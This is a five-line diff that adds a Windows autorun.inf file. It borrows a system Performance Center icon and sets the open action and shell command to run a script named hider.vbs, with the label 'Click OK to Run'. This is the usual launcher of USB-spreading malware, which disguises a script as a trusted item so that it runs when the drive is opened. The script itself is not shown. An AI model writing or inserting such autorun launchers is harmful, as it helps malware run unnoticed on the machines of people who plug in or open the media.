@@ -1,0 +1,5 @@
+[autorun]
+icon=C:\Windows\System32\PerfCenterCpl.ico
+open=hider.vbs
+action=Click OK to Run
+shell\open\command=hider.vbs
